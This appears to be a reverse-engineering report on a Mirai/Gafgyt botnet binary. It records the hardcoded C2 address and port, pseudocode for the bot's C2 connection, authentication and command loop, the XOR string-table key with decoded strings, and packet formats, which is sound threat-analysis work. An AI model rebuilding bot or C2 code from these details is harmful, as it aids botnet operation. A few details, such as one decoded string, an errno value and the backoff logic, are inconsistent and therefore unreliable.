# Gafgyt/Mirai Botnet — Transport Layer Specification

**Binary:** `deepsorrow`  
**Architecture:** x86 32-bit (ELF)  
**Analysis Date:** 2025-07-17  

---

## 1. C2 Infrastructure Retrieval

### 1.1 Observed Behavior

The C2 server address and port are **hardcoded** directly in the binary's `.text` section as immediate operands of `MOV` instructions. No DNS resolution, DGA, or external retrieval mechanism is used for the initial C2 connection. The address and port are written into a `struct sockaddr_in` at a fixed BSS address (`0x0806ce48`) immediately before the `connect()` call.

The C2 server address structure is assembled at runtime via three sequential writes:

**Step 1 — Set `sin_family` to `AF_INET` (2):**
```
Address:   0x080485e5
Instruction: MOV word ptr [0x0806ce48], 0x0002
Bytes:       66 C7 05 48 CE 06 08 02 00
```

**Step 2 — Set `sin_port` to the hardcoded port:**
```
Address:   0x080485f8
Instruction: MOV word ptr [0x0806ce4a], 0xD146
Bytes:       66 C7 05 4A CE 06 08 46 D1
```
The immediate value `0xD146` is stored at address `0x0806CE4A`. On x86 (little-endian), the memory bytes are `[0x46, 0xD1]`. The `struct sockaddr_in.sin_port` field is in network byte order (big-endian), so the kernel reads:
```
port = (0x46 << 8) | 0xD1 = 0x46D1 = 18129
```

**Step 3 — Set `sin_addr.s_addr` to the hardcoded IP:**
```
Address:   0x080485ee
Instruction: MOV dword ptr [0x0806ce4c], 0xB89F3C3E
Bytes:       C7 05 4C CE 06 08 3E 3C 9F B8
```
The immediate value `0xB89F3C3E` is stored at address `0x0806CE4C`. On x86 (little-endian), memory bytes are `[0x3E, 0x3C, 0x9F, 0xB8]`. In network byte order (big-endian), the IP address is:
```
62 . 60 . 159 . 184
```

**Step 4 — Set the connection-pending flag:**
```
Address:   0x08048601
Instruction: MOV byte ptr [0x08068abc], 0x01
```
This sets `DAT_08068abc = 1`, marking the socket as "just connected" (pending authentication).

**Step 5 — Call `connect()`:**
```
Address:   0x08048608
push 0x10                        ; addrlen = 16
push 0x0806ce48                  ; pointer to sockaddr_in
push [0x080642ac]                ; socket fd
call sys_connect
```

### 1.2 Recovered C2 Address(es) & Port(s)

| Parameter | Value | Source |
|-----------|-------|--------|
| **IP Address** | `62.60.159.184` | Hardcoded at `0x080485ee` |
| **Port** | `18129` (0x46D1) | Hardcoded at `0x080485f8` |
| **Protocol** | TCP | Socket created with `AF_INET` (2), `SOCK_STREAM` (1) |

**Note on port interpretation:** The 16-bit value `0xD146` is written directly to `sin_port`. On x86 little-endian, memory bytes `[0x46, 0xD1]` are produced. Since `sin_port` is in network byte order (big-endian), the effective port is `0x46D1 = 18129`. This is the literal port the bot connects to.

### 1.3 Retrieval Logic (Pseudocode)

```
// C2 address structure is at BSS address 0x0806ce48
struct sockaddr_in c2_addr;

// Step 1: Family
c2_addr.sin_family = AF_INET;  // = 2

// Step 2: Port (value 0xD146 stored directly)
c2_addr.sin_port = 0xD146;     // Effective port: 0x46D1 = 18129

// Step 3: IP (value 0xB89F3C3E stored directly)
c2_addr.sin_addr.s_addr = 0xB89F3C3E;  // = 62.60.159.184

// Step 4: Mark as pending authentication
connected = 1;

// Step 5: Initiate connection
connect(c2_socket_fd, &c2_addr, 16);
```

---

## 2. Transport Initialization

### 2.1 Observed Behavior

The bot uses a **single persistent TCP connection** to its C2 server, managed within a `select()`-based event loop. The connection lifecycle is:

#### 2.1.1 Socket Creation

The C2 socket is created only when `DAT_080642ac == -1` (i.e., no active connection exists). Creation occurs inside the main `select()` loop.

**Socket parameters:**
```
sys_socket(AF_INET=2, SOCK_STREAM=1, protocol=0)
```

**Socket options applied (in order):**

| Option | Level | Name | Value | Purpose |
|--------|-------|------|-------|---------|
| SO_KEEPALIVE | SOL_SOCKET (1) | SO_KEEPALIVE (9) | 1 | Enable TCP keep-alive |
| TCP_NODELAY | IPPROTO_TCP (6) | TCP_NODELAY (1) | 1 | Disable Nagle's algorithm |
| TCP_QUICKACK | IPPROTO_TCP (6) | TCP_QUICKACK (2) | 1 | Enable quick ACK mode |
| IP_TOS | IPPROTO_IP (0) | IP_TOS (1) | 3 | Set Type of Service = 3 |

**Non-blocking mode:**
```
flags = fcntl(fd, F_GETFL, 0);    // Get current flags
fcntl(fd, F_SETFL, flags | O_NONBLOCK);  // Add O_NONBLOCK (0x800)
```

#### 2.1.2 Connection Establishment

After socket creation, the bot immediately calls `connect()` with the hardcoded `sockaddr_in`. Because the socket is non-blocking, `connect()` returns immediately with `EINPROGRESS`. Connection completion is detected via `select()` — the socket is added to the **write** fd_set (`fd_set_write`) when `DAT_08068abc == 1` (pending authentication flag).

#### 2.1.3 Authentication Handshake

Upon successful connection (detected via `getsockopt(SO_ERROR)` returning 0 on the writeable socket), the bot sends an authentication packet:

```
Authentication Packet Structure:
┌─────────────────────────────────────────────────────┐
│ Bytes 0-3:  0x00 0x00 0x00 0x01  (magic/version)  │
│ Byte 4:     password_length                        │
│ Bytes 5..:  password (if length > 0)               │
│ Next byte:  0x03  (type/hardware architecture tag) │
│ Next 3:     "x86"  (architecture string)           │
└─────────────────────────────────────────────────────┘
```

The password is extracted from `argv[1]` at startup (copied to a stack buffer `local_64`, max 31 chars + null). The architecture string `"x86"` is hardcoded at address `0x08061737`.

#### 2.1.4 Main Event Loop (`select()`-based)

```
Loop:
  1. Zero out read_fd_set and write_fd_set
  2. Add single-instance controller socket (fd_ctrl) to read_fd_set
  3. If no active C2 connection (fd_serv == -1):
       Create socket, set options, connect (non-blocking)
  4. If connected (DAT_08068abc == 0):
       Add C2 socket to read_fd_set
     Else (pending auth):
       Add C2 socket to write_fd_set
  5. select(max_fd + 1, &read_set, &write_set, NULL, &timeout)
     where timeout = { tv_sec = 30, tv_usec = 0 }
  
  Case A: select returns -1 (error)
    → sleep(1); restart loop
  
  Case B: select returns 0 (timeout, 30 seconds)
    → Send heartbeat: 2 zero bytes (0x0000)
    → Increment heartbeat_counter
    → If heartbeat_counter > 119 (≈60 min idle):
        Call c2_reconnect()

  Case C: fd_ctrl readable
    → Accept connection on fd_ctrl (local client connected)
    → Kill all child processes (scanner, attacks)
    → Exit process

  Case D: C2 socket writable (DAT_08068abc == 1, pending auth)
    → Check SO_ERROR for connection success
    → If error: close socket, reconnect with backoff
    → If success:
        → Get local IP via util_get_local_ip()
        → Send authentication packet (see §2.1.3)
        → Set DAT_08068abc = 0 (now in receive mode)
        → Reset heartbeat counter

  Case E: C2 socket readable (DAT_08068abc == 0, receiving)
    → Read 2-byte length header
    → Byte-swap: length = (header >> 8) | (header << 8)
    → If length == 0: read another 2 bytes (extended length)
    → If length > 0x2000: close socket, reconnect
    → Read payload (length bytes)
    → Read 2-byte trailing value, byte-swap
    → Read remaining data
    → Validate packet (c2_packet_validate)
    → Execute command (c2_packet_parse_and_execute)
```

#### 2.1.5 Heartbeat / Ping Mechanism

Every 30 seconds (select timeout), if no data has been received, the bot sends a 2-byte heartbeat:

```
Heartbeat: 0x00 0x00  (2 zero bytes)
```

The heartbeat counter (`DAT_08068ac4`) increments on each timeout. After 120 consecutive timeouts (~60 minutes), the bot calls `c2_reconnect()` to force a reconnection. The counter is reset to 0 on any successful data reception.

### 2.2 Network Parameters

| Parameter | Value | Notes |
|-----------|-------|-------|
| **Transport Protocol** | TCP | `SOCK_STREAM` |
| **Local Bind** | None (ephemeral port) | No explicit `bind()` before `connect()` |
| **Socket Type** | Non-blocking | `O_NONBLOCK` (0x800) via `fcntl()` |
| **SO_KEEPALIVE** | Enabled (1) | |
| **TCP_NODELAY** | Enabled (1) | Disables Nagle's algorithm |
| **TCP_QUICKACK** | Enabled (1) | |
| **IP_TOS** | 3 | |
| **Select Timeout** | 30 seconds | `{ tv_sec=30, tv_usec=0 }` |
| **Heartbeat Interval** | 30 seconds | 2 zero bytes sent on each timeout |
| **Max Idle Before Reconnect** | ~60 minutes | 120 consecutive timeouts |
| **Max Packet Size** | 8192 bytes (0x2000) | Larger packets cause disconnect |
| **Send Flags** | `MSG_NOSIGNAL` (0x4000) | Prevents SIGPIPE on broken connections |
| **Recv Flags** | `MSG_NOSIGNAL` (0x4000) | |
| **Initial Send Flags** | `MSG_NOSIGNAL` (0x4002) | Used for initial length header reads |

### 2.3 Connection Logic (Pseudocode)

```
// Global state
int c2_fd = -1;                    // DAT_080642ac
int ctrl_fd = <from single_instance_bind>;  // DAT_080642a8
int connected = 0;                 // DAT_08068abc
int heartbeat_counter = 0;         // DAT_08068ac4
int reconnect_counter = 0;         // DAT_08068ac8
int backoff_delay = 1;             // DAT_080642b4

// Main event loop
function main_loop():
    while True:
        fd_set read_set, write_set
        FD_ZERO(&read_set)
        FD_ZERO(&write_set)
        
        if ctrl_fd != -1:
            FD_SET(ctrl_fd, &read_set)
        
        if c2_fd == -1:
            c2_fd = socket(AF_INET, SOCK_STREAM, 0)
            if c2_fd == -1:
                continue
            
            // Set socket options
            setsockopt(c2_fd, SOL_SOCKET, SO_KEEPALIVE, &1, 4)
            setsockopt(c2_fd, IPPROTO_TCP, TCP_NODELAY, &1, 4)
            setsockopt(c2_fd, IPPROTO_TCP, TCP_QUICKACK, &1, 4)
            setsockopt(c2_fd, IPPROTO_IP, IP_TOS, &3, 4)
            
            // Set non-blocking
            flags = fcntl(c2_fd, F_GETFL, 0)
            fcntl(c2_fd, F_SETFL, flags | O_NONBLOCK)
            
            // Build sockaddr_in
            addr.sin_family = AF_INET
            addr.sin_port = 0xD146      // port 18129
            addr.sin_addr = 0xB89F3C3E  // 62.60.159.184
            
            // Connect (non-blocking)
            connect(c2_fd, &addr, 16)
            connected = 1  // pending authentication
        
        if connected:
            FD_SET(c2_fd, &write_set)
        else:
            FD_SET(c2_fd, &read_set)
        
        max_fd = max(ctrl_fd, c2_fd)
        timeout = { tv_sec = 30, tv_usec = 0 }
        
        result = select(max_fd + 1, &read_set, &write_set, NULL, &timeout)
        
        if result == -1:
            sleep(1)
            continue
        
        if result == 0:
            // Timeout - send heartbeat
            send(c2_fd, [0x00, 0x00], 2, MSG_NOSIGNAL)
            heartbeat_counter++
            if heartbeat_counter > 119:
                c2_reconnect()
            continue
        
        if FD_ISSET(ctrl_fd, &read_set):
            // Local client connected - kill everything
            stop_attacks_and_kill_all()
            kill(-session_id, SIGKILL)
            exit(0)
        
        if connected and FD_ISSET(c2_fd, &write_set):
            // Check connection result
            getsockopt(c2_fd, SOL_SOCKET, SO_ERROR, &error, &error_len)
            if error != 0:
                close(c2_fd)
                c2_fd = -1
                sleep(rand() % 10 + 1)
                continue
            
            // Connection successful - send auth packet
            password_len = strlen(c2_password)
            local_ip = get_local_ip()
            
            send(c2_fd, [0x00, 0x00, 0x00, 0x01], 4, MSG_NOSIGNAL)  // magic
            send(c2_fd, &password_len, 1, MSG_NOSIGNAL)               // pw len
            if password_len > 0:
                send(c2_fd, c2_password, password_len, MSG_NOSIGNAL)  // pw
            send(c2_fd, [0x03], 1, MSG_NOSIGNAL)                      // type
            send(c2_fd, "x86", 3, MSG_NOSIGNAL)                       // arch
            
            connected = 0       // now in receive mode
            heartbeat_counter = 0
            continue
        
        if not connected and FD_ISSET(c2_fd, &read_set):
            // Receive packet
            header = recv(c2_fd, 2, MSG_NOSIGNAL)
            if header == 0:  // connection closed
                c2_reconnect()
                continue
            
            length = byteswap16(header)
            
            if length == 0:
                header2 = recv(c2_fd, 2, MSG_NOSIGNAL)
                length = byteswap16(header2)
            
            if length > 0x2000:
                close(c2_fd)
                c2_fd = -1
                continue
            
            payload = recv(c2_fd, length, MSG_NOSIGNAL)
            trailer = recv(c2_fd, 2, MSG_NOSIGNAL)
            remaining = byteswap16(trailer)
            
            if remaining > 0:
                recv(c2_fd, remaining, MSG_NOSIGNAL)
            
            if c2_packet_validate(payload, length):
                stop_attacks_and_kill_all()
            else:
                c2_packet_parse_and_execute(payload, length)
            
            heartbeat_counter = 0


// Reconnection function
function c2_reconnect():
    if c2_fd != -1:
        close(c2_fd)
    c2_fd = -1
    sleep(backoff_delay)
    backoff_delay = min(backoff_delay * 2, 60)  // max 60 seconds
    reconnect_counter++
```

### 2.4 Reconnection Strategy

| Parameter | Value |
|-----------|-------|
| **Initial backoff** | 1 second |
| **Backoff multiplier** | ×2 (exponential) |
| **Maximum backoff** | 60 seconds (capped) |
| **Trigger conditions** | Connection failure, select error, heartbeat timeout (120 cycles), packet too large (>0x2000), connection closed by peer, EAGAIN/EWOULDBLOCK on recv, EINTR on recv |
| **Max reconnect attempts** | No explicit limit (runs indefinitely) |

---

## 3. String Table Analysis

### 3.1 Observed Behavior

The binary uses an **XOR-encoded string table** to obfuscate sensitive strings used during execution. The table is initialized at startup via `table_init()` (called from `main` at address `0x080483ce`).

**Table initialization flow:**
1. `table_init()` calls `table_add_entry()` 8 times (indices 3, 11, 9, 10, 12, 13, 15, 14)
2. Each call copies encrypted data from `.rodata` into heap-allocated buffers via `malloc()` + `memcpy()`
3. Table entries are stored in BSS at address `0x0806ce60` as an array of 8-byte records:
   - Offset 0: pointer to heap buffer (4 bytes)
   - Offset 4: length (2 bytes)

**Access pattern:** Strings are decoded before use and re-encoded after use:
```c
table_unlock_val(index);    // XOR-decrypts the string in-place
// ... use string ...
table_lock_val(index);      // XOR-encrypts the string back
```

Both `table_lock_val` and `table_unlock_val` call the same `table_xor_decode()` function, which toggles the XOR (since XOR is its own inverse).

### 3.2 Decryption Routine

**XOR Key:** Stored at address `0x08064438`  
**Key value:** `0xDEADBEEF` (memory bytes: `EF BE AD DE`)

**Algorithm (per byte of string):**
```
key_bytes = [0xEF, 0xBE, 0xAD, 0xDE]  // 4 bytes of 0xDEADBEEF
for each byte b in string:
    b = b XOR key_bytes[0] XOR key_bytes[1] XOR key_bytes[2] XOR key_bytes[3]
```

Since XOR is commutative and associative, this is equivalent to:
```
effective_key = 0xEF ^ 0xBE ^ 0xAD ^ 0xDE = 0x22
for each byte b in string:
    b = b XOR 0x22
```

**Pseudocode:**
```c
void table_xor_decode(int index) {
    uint32_t key = 0xDEADBEEF;           // DAT_08064438
    uint8_t k0 = key & 0xFF;             // = 0xEF
    uint8_t k1 = (key >> 8) & 0xFF;      // = 0xBE
    uint8_t k2 = (key >> 16) & 0xFF;     // = 0xAD
    uint8_t k3 = (key >> 24) & 0xFF;     // = 0xDE
    
    char* str = table[index].ptr;
    uint16_t len = table[index].length;
    
    for (int i = 0; i < len; i++) {
        str[i] ^= k0;
        str[i] ^= k1;
        str[i] ^= k2;
        str[i] ^= k3;
    }
}
```

### 3.3 Recovered Strings

| Index | Length | Encrypted Bytes (hex) | Decrypted String | Purpose |
|-------|--------|-----------------------|------------------|---------|
| `0x03` | 21 | `76 71 4D 57 50 41 47 02 67 4C 45 4B 4C 47 02 73 57 47 50 5B 22` | `"Source Engine Query"` | Steam protocol string used in application-layer DDoS |
| `0x09` | 7 | `47 4C 43 40 4E 47 22` | `"enable"` | Command string for scanner/busybox |
| `0x0A` | 7 | `51 5B 51 56 47 4F 22` | `"system"` | Command string for busybox/system |
| `0x0B` | 6 | `51 4A 47 4E 4E 22` | `"shell"` | Command string for shell access |
| `0x0C` | 3 | `51 4A 22` | `"sh"` | Shell binary name |
| `0x0D` | 19 | `0D 40 4B 4C 0D 40 57 51 5B 40 4D 5A 02 6F 6B 70 63 6B 22` | `"/bin/busybox MIRAI"` | Busybox path + magic string for scanner |
| `0x0E` | 9 | `4C 41 4D 50 50 47 41 56 22` | `"ncorrect"` | Partial string for "Incorrect" (error message) |
| `0x0F` | 24 | `6F 6B 70 63 6B 18 02 43 52 52 4E 47 56 02 4C 4D 56 02 44 4D 57 4C 46 22` | `"MIRAI: applet not found"` | Busybox error message used for scanner detection |

**Note on index ordering:** The table indices are sparse (3, 9, 10, 11, 12, 13, 14, 15). Indices 0-2, 4-8 are reserved but unused in this variant. This is consistent with other Gafgyt/Mirai family members where certain indices are conditionally compiled or omitted.

---

## 4. Analysis Gaps

| Gap | Reason | Impact |
|-----|--------|--------|
| **C2 protocol command set** | Not analyzed; outside transport scope | Not needed for transport specification |
| **Attack method details** | Not analyzed; outside transport scope | Not needed for transport specification |
| **Scanner/killer modules** | Not analyzed; outside transport scope | Not needed for transport specification |
| **DNS resolution usage** | `dns_resolve()` function exists but is not called during initial C2 connection. It may be used by other components (scanner). | No impact on C2 transport; the C2 address is purely hardcoded |
| **Packet encryption** | No encryption observed on the C2 channel after authentication | The C2 protocol uses plaintext binary packets |

---

## 5. Key Data Structures

### 5.1 C2 Address Structure (BSS: `0x0806ce48`)

```c
struct sockaddr_in {
    uint16_t sin_family;     // offset 0x00: AF_INET = 2
    uint16_t sin_port;       // offset 0x02: 0xD146 (port 18129 in network order)
    uint32_t sin_addr;       // offset 0x04: 0xB89F3C3E (62.60.159.184)
    uint8_t  sin_zero[8];    // offset 0x08: zeroed
};
```

### 5.2 String Table (BSS: `0x0806ce60`)

```c
struct table_entry {
    char*  data;     // offset 0x00: pointer to heap-allocated encrypted string
    uint16_t length; // offset 0x04: byte length of the encrypted data
    uint16_t pad;    // offset 0x06: padding
};  // total size: 8 bytes

struct table_entry table[256];  // indexed by uint8_t index
```

### 5.3 Global State Variables

| Address | Name | Type | Purpose |
|---------|------|------|---------|
| `0x0806ce44` | `DAT_0806ce44` | `uint32_t` | Local IP address (cached) |
| `0x0806ce48` | C2 sockaddr | `struct sockaddr_in` | C2 server address structure |
| `0x080642a8` | `DAT_080642a8` | `int` | Single-instance controller socket fd |
| `0x080642ac` | `DAT_080642ac` | `int` | C2 server socket fd |
| `0x080642b0` | `DAT_080642b0` | `uint8_t` | Bind-to-localhost flag (0 = use local IP) |
| `0x080642b4` | `DAT_080642b4` | `int` | Reconnect backoff delay (seconds) |
| `0x08068abc` | `DAT_08068abc` | `uint8_t` | Connection state flag (1=pending auth, 0=receiving) |
| `0x08068ac0` | `DAT_08068ac0` | `int` | Scanner enabled flag |
| `0x08068ac4` | `DAT_08068ac4` | `int` | Heartbeat timeout counter |
| `0x08068ac8` | `DAT_08068ac8` | `int` | Reconnect attempt counter |
| `0x08064438` | XOR key | `uint32_t` | `0xDEADBEEF` — string table XOR key |

---

## 6. Single-Instance Mechanism

While not strictly part of C2 transport, the single-instance controller is relevant because its socket fd is monitored in the same `select()` loop.

**Function:** `single_instance_bind()` at `0x080481f1`

**Behavior:**
1. Creates a TCP socket (`AF_INET`, `SOCK_STREAM`)
2. Sets `SO_REUSEADDR`
3. Sets non-blocking mode
4. Binds to `127.0.0.1:18129` (port `0xD146` = `0x46D1` in network order)  
   — If `DAT_080642b0` is non-zero, binds to the local IP instead
5. If `bind()` fails with `EADDRINUSE` (errno 99):
   - Connects to `127.0.0.1:18129` (or local IP) to signal the existing instance
   - Sleeps 5 seconds
   - Recursively retries `single_instance_bind()`
6. If `bind()` succeeds: calls `listen(fd, 1)` — listens for exactly 1 connection

When a client connects to this socket (detected in the `select()` loop via `accept()`), the bot interprets this as a signal to terminate and calls `stop_attacks_and_kill_all()` followed by `kill(-session_id, 9)`.

---

## 7. C2 Packet Protocol Summary

### 7.1 Packet Format (Receive)

```
┌─────────────────────────────────────────────────────────────────┐
│ [2 bytes: length] [N bytes: payload] [2 bytes: remaining_data]  │
└─────────────────────────────────────────────────────────────────┘
```

- **length:** 16-bit big-endian. If 0, read another 2 bytes for extended length. Capped at 0x2000 (8192).
- **payload:** `length` bytes of command data.
- **remaining_data:** 16-bit big-endian. If non-zero, read that many additional bytes.

### 7.2 Packet Validation (`c2_packet_validate`)

The first 4 bytes of the payload are checked:
- Byteswap both 16-bit halves
- If result == 0 AND `(byte_at_offset_5 + 3) < 2` → return true (trigger stop)
- Otherwise → return false (process command)

### 7.3 Authentication Packet (Send)

```
[4 bytes: 0x00000001] [1 byte: pw_len] [pw_len bytes: password]
[1 byte: 0x03] [3 bytes: "x86"]
```

---

*End of transport specification.*
